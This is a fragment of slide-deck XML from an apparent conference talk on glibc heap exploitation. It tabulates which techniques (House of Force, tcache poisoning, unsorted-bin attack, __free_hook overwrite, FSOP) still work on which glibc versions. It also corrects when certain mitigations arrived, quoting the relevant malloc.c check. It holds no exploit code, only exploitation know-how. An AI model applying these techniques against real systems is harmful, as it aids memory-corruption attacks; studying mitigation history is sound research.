          <p:cNvPr id="326" name="Google Shape;326;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9326880"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2.39</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="327" name="Google Shape;327;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10396728" y="1581912"/>
            <a:ext cx="1069848"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200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>2.41</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="328" name="Google Shape;328;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="202082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_IO vtable hijack</a:t>
            </a:r>
            <a:endParaRPr sz="1250">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="329" name="Google Shape;329;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4023360" y="196596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5093208" y="19659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6163056" y="19659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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7232904" y="19659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
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8302752" y="19659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p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9372600" y="19659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10442448" y="19659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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="254660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unsorted-bin attack</a:t>
            </a:r>
            <a:endParaRPr sz="1250">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="337" name="Google Shape;337;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4023360" y="24917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5093208" y="24917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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6163056" y="249174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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7232904" y="249174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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8302752" y="249174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
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9372600" y="249174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10442448" y="249174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
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="307238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House of Force</a:t>
            </a:r>
            <a:endParaRPr sz="1250">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="345" name="Google Shape;345;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4023360" y="301752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p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="301752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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6163056" y="301752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7232904" y="301752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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8302752" y="301752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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9372600" y="301752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
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10442448" y="301752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3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="359816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fastbin dup (naive)</a:t>
            </a:r>
            <a:endParaRPr sz="1250">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="353" name="Google Shape;353;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4023360" y="354330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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="354330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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6163056" y="354330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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7232904" y="354330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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8302752" y="354330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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9372600" y="354330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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10442448" y="354330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3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="412394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tcache poison (naive)</a:t>
            </a:r>
            <a:endParaRPr sz="1250">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="361" name="Google Shape;361;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4023360" y="406908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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="406908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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6163056" y="406908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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7232904" y="406908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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8302752" y="406908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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9372600" y="406908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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10442448" y="406908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3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="464972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__free_hook finish</a:t>
            </a:r>
            <a:endParaRPr sz="1250">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="369" name="Google Shape;369;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4023360" y="459486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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="459486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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6163056" y="459486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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7232904" y="459486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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8302752" y="45948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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9372600" y="45948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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10442448" y="4594860"/>
            <a:ext cx="978408" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 6000"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3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="5175504"/>
            <a:ext cx="3383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1250"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>FSOP / house-of-apple2</a:t>
            </a:r>
            <a:endParaRPr sz="1250">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="377" name="Google Shape;377;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4023360"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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208"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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6163056"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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7232904"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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8302752"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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9372600"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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10442448" y="5120640"/>
            <a:ext cx="978408" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 6000"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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="5852160"/>
            <a:ext cx="256032" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 10714" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14351F"/>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3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="5833872"/>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200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>works</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="386" name="Google Shape;386;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1920240" y="5852160"/>
            <a:ext cx="256032" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 10714" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3A1618"/>
          </a:solidFill>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="E548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3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2240280" y="5833872"/>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200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>dead</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="388" name="Google Shape;388;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943600" y="5833872"/>
            <a:ext cx="57607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1200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>full matrix + source refs in the repo →</a:t>
            </a:r>
            <a:endParaRPr sz="12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393" name="Shape 393"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="394" name="Google Shape;394;p24"/>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VI · CORRECTION 1/2</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="395" name="Google Shape;395;p24"/>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24 / 27</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="396" name="Google Shape;396;p24"/>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The internet says 2.29. It died in 2.28.</a:t>
            </a:r>
            <a:endParaRPr sz="3400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="397" name="Google Shape;397;p24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1417320"/>
            <a:ext cx="111556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B929B"/>
              </a:buClr>
              <a:buSzPts val="1700"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Unsorted-bin attack. The guard that kills it — bck-&gt;fd != victim — appears a release earlier than everyone cites.</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="398" name="Google Shape;398;p24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2377440"/>
            <a:ext cx="11155680" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 2500" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A1D23"/>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4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="704088" y="2523744"/>
            <a:ext cx="10753344" cy="1536192"/>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 glibc 2.28  _int_malloc, unsorted loop:</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if (__glibc_unlikely (bck-&gt;fd != victim))</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250"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>    malloc_printerr ("… corrupted unsorted chunks");   // present in 2.28</a:t>
            </a:r>
            <a:endParaRPr sz="1250">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29B"/>
              </a:buClr>
              <a:buSzPts val="1250"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>// absent in 2.27  -&gt;  attack still worked there</a:t>
            </a:r>
            <a:endParaRPr sz="1250">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="400" name="Google Shape;400;p24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="-660000">
            <a:off x="8503920" y="4617720"/>
            <a:ext cx="3108960" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="E3B34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E3B341"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CORRECTED</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="401" name="Google Shape;401;p24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9997495" y="5871395"/>
            <a:ext cx="2194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2000"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>▮ DEMO</a:t>
            </a:r>
            <a:endParaRPr sz="2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406" name="Shape 406"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="407" name="Google Shape;407;p25"/>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ACT VI · CORRECTION 2/2</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408" name="Google Shape;408;p25"/>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25 / 27</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="409" name="Google Shape;409;p25"/>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__free_hook isn't removed. It's a decoy.</a:t>
            </a:r>
            <a:endParaRPr sz="3400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="410" name="Google Shape;410;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1645920"/>
            <a:ext cx="676656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700"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>The symbol still ships in .bss (nm proves it).</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1300"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E3B341"/>
              </a:buClr>
              <a:buSzPts val="1700"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1700">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>malloc.c simply stopped calling it in 2.34.</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1300"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E3B341"/>
              </a:buClr>
              <a:buSzPts val="1700"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» Tooling resolves it; overwriting it does nothing — the trap that opened this talk.</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
